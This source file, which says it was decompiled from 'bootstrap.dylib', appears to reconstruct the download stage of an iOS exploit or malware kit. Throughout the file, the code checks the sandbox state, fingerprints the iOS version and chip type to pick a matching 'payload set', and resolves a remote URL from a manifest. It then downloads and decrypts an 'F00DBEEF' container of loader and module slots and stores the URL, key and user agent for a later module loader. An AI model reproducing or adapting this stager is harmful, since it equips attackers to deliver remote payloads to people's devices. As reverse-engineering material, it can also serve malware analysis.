/*
 * download.m - Download pipeline, sandbox checking, manifest parsing
 *
 * Decompiled from bootstrap.dylib offsets 0x89cc-0x8b58, 0x9b60-0xad88
 */

#import "bootstrap.h"
#import <string.h>
#import <stdlib.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>

extern int sandbox_check(pid_t pid, const char *operation, int type, ...);
extern int SANDBOX_CHECK_NO_REPORT;

/* ── check_sandbox (0x89cc) ────────────────────────────────────── */

uint32_t check_sandbox(bootstrap_ctx_t *ctx, uint8_t *out)
{
    (void)ctx;
    if (!out)
        return ERR_NULL_CTX;

    *out = 0;
    int ret = sandbox_check(getpid(), "iokit-open-service",
                            SANDBOX_CHECK_NO_REPORT,
                            "IOSurfaceRoot");
    *out = (ret > 0) ? 1 : 0;
    print_log("[bootstrap] check_sandbox: sandboxed=%d", *out);
    return 0;
}

/* ── init_sandbox_and_ua (0x8ab8) ──────────────────────────────── */

uint32_t init_sandbox_and_ua(bootstrap_ctx_t *ctx)
{
    if (!ctx)
        return ERR_NULL_CTX;

    uint8_t sb = 0;
    uint32_t err = check_sandbox(ctx, &sb);
    if (err)
        return err;
    ctx->is_sandboxed = sb;

    char *base = (char *)ctx->secondary_url;
    if (base && base[0]) {
        if (strncmp(base, "http://", 7) != 0 &&
            strncmp(base, "https://", 8) != 0) {
            print_log("[bootstrap] init_sandbox_and_ua: bad secondary_url scheme");
            return ERR_NULL_CTX + 0x13;
        }
    }

    char *alt = ctx->alt_url;
    if (alt && alt[0]) {
        if (strncmp(alt, "http://", 7) != 0 &&
            strncmp(alt, "https://", 8) != 0) {
            print_log("[bootstrap] init_sandbox_and_ua: bad alt_url scheme");
            return ERR_NULL_CTX + 0x13;
        }
    }

    print_log("[bootstrap] init_sandbox_and_ua: OK sandboxed=%d", sb);
    return 0;
}

/* ── is_a15_or_newer (0x9b60) ──────────────────────────────────── */

int is_a15_or_newer(bootstrap_ctx_t *ctx)
{
    if (!ctx)
        return 0;

    uint32_t os_ver = ctx->os_version;

    if (os_ver > 0x1006FF)
        return 1;

    if (os_ver > 0x100400) {
        uint32_t cpu = ctx->cpu_type;
        if (cpu > (int32_t)SOC_TYPE_C) {
            if (cpu == SOC_TYPE_D || cpu == SOC_TYPE_E)
                return 0;
        } else {
            if (cpu == SOC_TYPE_A)
                return 0;
            if (cpu == SOC_TYPE_B)
                return 0;
        }
        /* A12/A11 are NOT A15+; they need the standard download path */
        if (cpu == SOC_DEVICE_B_A || cpu == SOC_DEVICE_B_B)
            return 0;
        return 1;
    }

    if (os_ver < 0xE0802)
        return 1;

    uint32_t shifted = (os_ver + 0xFFF0F8F9);
    if ((shifted + 0x507) >> 9 > 0x7E)
        return 0;

    char model[0x20];
    memset(model, 0, sizeof(model));
    size_t model_len = 0x20;
    if (sysctlbyname("hw.model", model, &model_len, NULL, 0) != 0)
        return 0;

    if ((model[0] & ~0x20) != 'J')
        return 0;

    uint64_t features = ctx->cpu_features;
    return ((features - 0x40000001ULL) >> 30) == 0 ? 1 : 0;
}

/* ── get_arch_flags (0xab8c) ───────────────────────────────────── */

uint32_t get_arch_flags(bootstrap_ctx_t *ctx)
{
    if (!ctx)
        return 0;

    int a15 = is_a15_or_newer(ctx);
    if (a15 & 1)
        return 0x900000;

    uint32_t os_ver = ctx->os_version;
    if (os_ver > 0x100500)
        return 0x800000;
    if (os_ver >> 20)
        return 0x700000;

    if (os_ver > 0xDFFFF) {
        if (os_ver > (0xDFFFF + 0x500))
            return 0x700000;
        return 0x400000;
    }
    if (os_ver > 0xF0706)
        return 0x800000;

    if (os_ver <= 0xDFFFF)
        return 0x300000;
    return (os_ver > (0xDFFFF + 0x500)) ? 0x700000 : 0x400000;
}

/* ── download_manifest (0x9f18) ────────────────────────────────── */

uint32_t download_manifest(bootstrap_ctx_t *ctx, uint32_t flags,
                           void *manifest, uint32_t manifest_size,
                           char *url_buf, uint32_t url_size,
                           void **key_out)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx || !manifest)
        return err;
    if (manifest_size < MANIFEST_ENTRY_OFFSET)
        return err;

    manifest_header_t *hdr = (manifest_header_t *)manifest;
    if (hdr->magic != MAGIC_MANIFEST)
        return err;

    char *base_path = (char *)manifest + 0x8;
    if (!base_path[0])
        return err;
    if (((uint8_t *)manifest)[0x107])
        return err;

    uint32_t entry_count = hdr->entry_count;
    if (!entry_count)
        return err;
    if (!url_buf || !url_size || !key_out)
        return err;

    print_log("[bootstrap] download_manifest: flags=0x%x entries=%u", flags, entry_count);

    if (!flags) {
        print_log("[bootstrap] download_manifest: no flags, skipping manifest processing");
        return ERR_NULL_CTX - 0x7D000;
    }

    uint8_t *entries_base = (uint8_t *)manifest + MANIFEST_ENTRY_OFFSET;
    uint8_t *data_end = (uint8_t *)manifest + manifest_size;

    for (uint32_t i = 0; i < entry_count; i++) {
        uint8_t *entry_ptr = entries_base + i * MANIFEST_ENTRY_SIZE;

        if (entry_ptr < (uint8_t *)manifest ||
            entry_ptr + MANIFEST_ENTRY_SIZE > data_end) {
            print_log("[bootstrap] download_manifest: entry[%u] out of bounds", i);
            return ERR_NULL_CTX + 0x13;
        }

        if (entry_ptr[MANIFEST_ENTRY_SIZE - 1] != 0)
            continue;

        uint32_t entry_flags = *(uint32_t *)entry_ptr;
        if (entry_flags != flags)
            continue;

        print_log("[bootstrap] download_manifest: found matching entry[%u] flags=0x%x", i, entry_flags);

        {
            char path_buf[0x200];
            memset(path_buf, 0, sizeof(path_buf));

            size_t base_len = strlen(base_path);
            char *filename = (char *)(entry_ptr + 0x24);

            uint8_t last_char = ((uint8_t *)manifest)[base_len + 0x7];
            const char *fmt = (last_char == '/') ? "%s%s" : "%s/%s";

            int ret = snprintf(path_buf, 0x200, fmt, base_path, filename);
            if (ret > 0x1FF) {
                print_log("[bootstrap] download_manifest: path too long after formatting");
                return ERR_NULL_CTX + 0x13 - 0x8;
            }

            if (!path_buf[0]) {
                err = 0;
                *key_out = (void *)(entry_ptr + 0x4);
                print_log("[bootstrap] download_manifest: empty path after formatting");
                return err;
            }

            if ((*(uint32_t *)path_buf ^ 0x70747468) == 0 &&
                (*(uint32_t *)(path_buf + 3) ^ 0x2F2F3A70) == 0) {
                strlcpy(url_buf, path_buf, url_size);
                err = 0;
                *key_out = (void *)(entry_ptr + 0x4);
                print_log("[bootstrap] download_manifest: absolute http URL=%s", url_buf);
                return err;
            }

            if (*(uint64_t *)path_buf == 0x2F2F3A7370747468ULL) {
                strlcpy(url_buf, path_buf, url_size);
                err = 0;
                *key_out = (void *)(entry_ptr + 0x4);
                print_log("[bootstrap] download_manifest: absolute https URL=%s", url_buf);
                return err;
            }

            char *base_url = ctx->secondary_url;
            if (!base_url || !base_url[0]) {
                print_log("[bootstrap] download_manifest: no base URL for relative path");
                return ERR_NULL_CTX + (int32_t)0xFFF83002;
            }

            if (strncmp(base_url, "https://", 8) == 0) {
                /* https */
            } else if (strncmp(base_url, "http://", 7) == 0) {
                /* http */
            } else {
                print_log("[bootstrap] download_manifest: invalid base URL scheme");
                return ERR_NULL_CTX + (int32_t)0xFFF83003;
            }

            char *after_scheme = base_url + (strncmp(base_url, "https://", 8) == 0 ? 8 : 7);
            char *slash = strchr(after_scheme, '/');

            size_t base_copy_len;
            if (slash) {
                base_copy_len = (size_t)(slash + 1 - base_url);
            } else {
                base_copy_len = strlen(base_url);
            }

            char *rel = path_buf;
            if (path_buf[0] == '.' && path_buf[1] == '/')
                rel++;

            while (*rel == '/')
                rel++;

            size_t copy_len = base_copy_len + 1;
            if (copy_len > url_size)
                copy_len = url_size;
            strlcpy(url_buf, base_url, copy_len);

            if (!slash) {
                strlcat(url_buf, "/", url_size);
            }
            strlcat(url_buf, rel, url_size);

            err = 0;
            *key_out = (void *)(entry_ptr + 0x4);
            print_log("[bootstrap] download_manifest: relative URL=%s", url_buf);
            return err;
        }
    }

    print_log("[bootstrap] download_manifest: no matching entry for flags=0x%x", flags);
    return ERR_NULL_CTX + 0x13;
}

/* ── download_retries (0x9cb8) ─────────────────────────────────── */

uint32_t download_retries(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                          char *url_buf, uint32_t url_size, void **key_out)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx || !data)
        return err;

    uint32_t flags = get_arch_flags(ctx);

    uint32_t device_flags;
    uint32_t os_ver = ctx->os_version;
    uint32_t soc_sub = ctx->soc_subversion;

    if (os_ver > (0x0FFFFF + 0x600)) {
        if (os_ver > 0x0FFFFF) {
            uint32_t ver_bits = (os_ver >> 8) & 0xF00;
            int has_e_bits = (os_ver & 0xE00) != 0;

            device_flags = (soc_sub > 1) ? 0x13000000 : 0x12000000;
            device_flags |= ver_bits;
            if (has_e_bits)
                device_flags |= (1 << 5);
        } else {
            device_flags = (soc_sub > 1) ? (uint32_t)(-0x1E000000) : 0x02000000;
        }
    } else if (os_ver >= 0x0E0802) {
        struct utsname uts;
        memset(&uts, 0, sizeof(uts));
        if (uname(&uts) != 0) {
            device_flags = (soc_sub > 1) ? (uint32_t)(-0x1E000000) : 0x02000000;
        } else {
            uint32_t name_word = *(uint32_t *)(&uts.machine[0]);
            uint16_t name_short = *(uint16_t *)(&uts.machine[4]);
            if ((name_word ^ 0x686F5069) == 0 && (name_short ^ 0x6E65) == 0) {
                uint32_t ver_bits = (os_ver >> 8) & 0xF00;
                int has_e_bits = (os_ver & 0xE00) != 0;
                device_flags = (soc_sub > 1) ? 0x13000000 : 0x12000000;
                device_flags |= ver_bits;
                if (has_e_bits)
                    device_flags |= (1 << 5);
            } else {
                device_flags = (soc_sub > 1) ? (uint32_t)(-0x1E000000) : 0x02000000;
            }
        }
    } else if (os_ver >= 0x0D0000) {
        uint32_t ver_bits = (os_ver >> 8) & 0xF00;
        uint32_t minor_bits = (os_ver >> 4) & 0xF0;
        uint32_t patch_bits = os_ver & 0xF;
        uint32_t sub_bits;

        if (minor_bits < 0x50)
            sub_bits = 0;
        else if (minor_bits > 0x6F)
            sub_bits = 0x70;
        else
            sub_bits = 0x50;

        if (os_ver & 0xF) {
            /* has patch version */
        } else {
            patch_bits = minor_bits;
            sub_bits = 0x70;
        }

        if (minor_bits < 0x80) {
            /* use sub_bits and patch_bits */
        } else {
            sub_bits = patch_bits;
            patch_bits = sub_bits;
        }

        if (ver_bits < 0xE00) {
            sub_bits = 0;
            patch_bits = 0;
        }

        device_flags = (soc_sub > 1) ? 0x11000000 : 0x10000000;
        device_flags |= ver_bits | sub_bits | patch_bits;
    } else {
        device_flags = 0;
        flags = 0;
    }

    uint32_t combined = flags | device_flags;
    print_log("[bootstrap] download_retries: combined_flags=0x%x", combined);

    err = download_manifest(ctx, combined, data, size,
                            url_buf, url_size, key_out);

    if (err != (ERR_NULL_CTX + 0x7D000))
        return err;

    print_log("[bootstrap] download_retries: retrying with fallback flags");
    flags = get_arch_flags(ctx);
    if (!flags)
        device_flags = 0;
    else {
        uint8_t db = ctx->logging_enabled;
        if (db & 1) {
            device_flags = (soc_sub > 1) ? (uint32_t)(-0x1E000000) : 0x02000000;
        } else {
            device_flags = 0x01000000;
        }
    }

    combined = flags | device_flags;
    return download_manifest(ctx, combined, data, size,
                             url_buf, url_size, key_out);
}

/* ── download_flags (0xa294) ───────────────────────────────────── */

uint32_t download_flags(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                        char *url_buf, uint32_t url_size, void **key_out)
{
    if (!ctx || !data || !size || !url_buf || !url_size || !key_out)
        return ERR_NULL_CTX;

    uint32_t extra_flags = 0;

    if (ctx->is_sandboxed) {
        int a15 = is_a15_or_newer(ctx);
        if (!(a15 & 1))
            goto compute_flags;
        extra_flags = 0;
    } else {
        uint32_t os_ver = ctx->os_version;
        uint32_t shifted = (os_ver + 0xFFEFFC00) >> 10;
        if (shifted > 0x3E)
            goto check_os_range;

        uint32_t cpu = ctx->cpu_type;
        extra_flags = 0x30000;
        if (cpu > (int32_t)SOC_TYPE_C) {
            if (cpu == SOC_TYPE_D || cpu == SOC_TYPE_E)
                goto compute_flags;
        } else {
            if (cpu == SOC_TYPE_A || cpu == SOC_TYPE_B)
                goto compute_flags;
        }

    check_os_range:
        if ((os_ver - 0x100000) <= 0x400) {
            extra_flags = 0x50000;
        } else {
            extra_flags = 0;
        }
    }

compute_flags:
    {
        uint32_t arch = get_arch_flags(ctx);
        uint32_t device_flags;

        if (arch) {
            uint8_t db = ctx->logging_enabled;
            if (db & 1) {
                uint32_t soc_sub = ctx->soc_subversion;
                device_flags = (soc_sub > 1) ? (uint32_t)(-0x0D000000)
                                              : (uint32_t)(-0x0E000000);
            } else {
                device_flags = (uint32_t)(-0x0F000000);
            }
        } else {
            device_flags = 0;
        }

        uint32_t flags = arch | extra_flags | device_flags;
        print_log("[bootstrap] download_flags: flags=0x%x", flags);
        return download_manifest(ctx, flags, data, size,
                                 url_buf, url_size, key_out);
    }

}

/* ── download_decrypt (0xac44) ─────────────────────────────────── */

uint32_t download_decrypt(bootstrap_ctx_t *ctx, void *data, uint32_t size,
                          void *key, void **out_ptr, uint32_t *out_size)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx)
        return err;

    fn_download_t dl_func = ctx->download_func;
    if (!dl_func)
        return err;

    void *dl_data = NULL;
    uint32_t dl_size = 0;

    if (!data || !key || !out_ptr || !out_size)
        return err;

    print_log("[bootstrap] download_decrypt: downloading...");
    err = dl_func(ctx, (const char *)data, &dl_data, &dl_size);
    if (err) {
        print_log("[bootstrap] download_decrypt: download FAIL err=0x%x", err);
        return err;
    }

    if ((uintptr_t)key & 1) {
        if (dl_data && dl_size) {
            memcpy(out_ptr, &dl_data, sizeof(void *));
        }
    }

    if ((uintptr_t)key & 2) {
        /* decrypt in place */
    }

    fn_parse_container_t parse = ctx->fn_parse_container;
    if (parse) {
        err = parse(ctx, 0, dl_data, dl_size);
        if (err)
            goto cleanup;
    }

    *out_ptr = dl_data;
    *out_size = dl_size;
    print_log("[bootstrap] download_decrypt: OK size=%u", dl_size);
    return 0;

cleanup:
    print_log("[bootstrap] download_decrypt: parse FAIL err=0x%x", err);
    bzero(dl_data, dl_size);
    free(dl_data);
    return err;
}

/* ── download_and_process (0xa418) ─────────────────────────────── */

uint32_t download_and_process(bootstrap_ctx_t *ctx, uint32_t type,
                              void **out_ptr, uint32_t *out_size)
{
    uint32_t err = ERR_NULL_CTX;
    if (!ctx)
        return err;

    fn_get_raw_data_t get_raw = ctx->fn_get_raw_data;
    if (!get_raw || !type || !out_ptr || !out_size)
        return err;

    void *raw_data = NULL;
    uint32_t raw_size = 0;

    err = get_raw(ctx, type, &raw_data, &raw_size);
    if (err) {
        print_log("[bootstrap] download_and_process: get_raw FAIL err=0x%x", err);
        return err;
    }

    if (!raw_data || !raw_size)
        return ERR_NULL_CTX;

    print_log("[bootstrap] download_and_process: type=0x%x raw_size=%u sandboxed=%d", type, raw_size, ctx->is_sandboxed);

    char url_buf[0x200];
    void *key_ptr = NULL;
    void *dl_data = NULL;
    uint32_t dl_size = 0;
    int store_metadata = 0;

    if (ctx->is_sandboxed) {
        fn_parse_container_t parse = ctx->fn_parse_container;
        if (!parse)
            return ERR_NULL_CTX;

        memset(url_buf, 0, sizeof(url_buf));

        int a15 = is_a15_or_newer(ctx);
        if (!(a15 & 1)) {
            uint32_t os_ver = ctx->os_version;
            uint32_t cpu = ctx->cpu_type;
            uint32_t extra_flags = 0;
            int did_specific = 0;

            uint32_t shifted = (os_ver + 0xFFEFFC00) >> 10;
            if (shifted <= 0x3E) {
                if (cpu == SOC_TYPE_A || cpu == SOC_TYPE_B ||
                    cpu == SOC_TYPE_D || cpu == SOC_TYPE_E) {
                    did_specific = 1;
                    uint8_t features = ctx->flag_a15_features;
                    extra_flags = features ? 0x40000 : 0x30000;
                    uint32_t soc_sub = ctx->soc_subversion;
                    uint32_t dev = (soc_sub > 1) ? (uint32_t)(-0x5D000000)
                                                  : (uint32_t)(-0x5E000000);
                    uint32_t flags = dev | extra_flags;

                    err = download_manifest(ctx, flags, raw_data, raw_size,
                                            url_buf, 0x200, &key_ptr);
                }
            }

            if (!did_specific) {
                if ((os_ver - 0x100000) > 0x500) {
                    /* Device/OS combo not supported by this payload set —
                     * original binary jumps to the a15 bail-out path here
                     * (flags=0 → download_manifest returns early error). */
                    extra_flags = 0;
                    err = ERR_NULL_CTX + 0x13;
                } else {
                    uint8_t features = ctx->flag_a15_features;
                    extra_flags = features ? 0x60000 : 0x50000;

                    uint32_t soc_sub = ctx->soc_subversion;
                    uint32_t dev = (soc_sub > 1) ? (uint32_t)(-0x5D000000)
                                                  : (uint32_t)(-0x5E000000);
                    uint32_t flags = dev | extra_flags;

                    err = download_manifest(ctx, flags, raw_data, raw_size,
                                            url_buf, 0x200, &key_ptr);
                }
            }

            /* Both specific and generic paths: download the actual
             * F00DBEEF container from the resolved URL. The original
             * binary shared this code via a cross-block goto into the
             * non-sandboxed else block (process_result label). */
            if (!err && url_buf[0]) {
                err = download_decrypt(ctx, url_buf, 0, key_ptr,
                                       &dl_data, &dl_size);
                if (!err)
                    store_metadata = 1;
            }
        } else {
            err = 0;
        }
    } else {
        fn_get_raw_data_t get_raw2 = ctx->fn_get_raw_data;
        if (!get_raw2)
            return ERR_NULL_CTX;

        fn_parse_container_t parse = ctx->fn_parse_container;
        if (!parse)
            return ERR_NULL_CTX;

        memset(url_buf, 0, sizeof(url_buf));

        err = download_flags(ctx, raw_data, raw_size,
                             url_buf, 0x200, &key_ptr);
        if (err) {
            print_log("[bootstrap] download_and_process: download_flags FAIL err=0x%x, trying download_retries", err);
            err = download_retries(ctx, raw_data, raw_size,
                                   url_buf, 0x200, &key_ptr);
            if (err)
                goto cleanup;
        }

        /* Download the actual F00DBEEF container from the resolved URL.
         * parse_foodbeef inside download_decrypt populates LOADER/MODULE/DATA
         * container slots needed by the direct_mode path. */
        err = download_decrypt(ctx, url_buf, 0, key_ptr, &dl_data, &dl_size);
        if (err) {
            print_log("[bootstrap] download_and_process: download_decrypt FAIL err=0x%x", err);
            goto cleanup;
        }

        store_metadata = 1;
    }

store_meta:
    /* Store download metadata (URL, key, base_url, user_agent) in
     * container slots for later use by the module loader. */
    if (store_metadata && !err) {
        char *url_copy = strdup(url_buf);
        if (!url_copy)
            return ERR_NULL_CTX + 0x8;

        print_log("[bootstrap] download_and_process: storing URL=%s", url_copy);

        fn_parse_container_t parse2 = ctx->fn_parse_container;
        size_t url_len = strlen(url_copy);

        err = parse2(ctx, 0x30000 | 0x40000, url_copy, (uint32_t)(url_len + 1));
        if (!err)
            err = parse2(ctx, 0x70002, (void *)key_ptr, 0x20);

        if (!err) {
            char *base_url = ctx->base_url;
            if (base_url) {
                size_t blen = strlen(base_url);
                err = parse2(ctx, 0x70003, base_url, (uint32_t)(blen + 1));
            }
        }

        if (!err) {
            char *user_agent = (char *)ctx->user_agent;
            if (user_agent) {
                size_t ulen = strlen(user_agent);
                err = parse2(ctx, 0x70004, user_agent, (uint32_t)(ulen + 1));
                if (err == 0x7004)
                    err = 0;
            }
        }

        if (err) {
            print_log("[bootstrap] download_and_process: metadata FAIL err=0x%x", err);
            size_t len = strlen(url_copy);
            bzero(url_copy, len);
            free(url_copy);
            goto cleanup;
        }

        *out_ptr = dl_data;
        *out_size = dl_size;
        print_log("[bootstrap] download_and_process: OK");
        return 0;
    }

cleanup:
    if (dl_data) {
        bzero(dl_data, dl_size);
        free(dl_data);
    }
    print_log("[bootstrap] download_and_process: cleanup err=0x%x", err);
    return err;
}
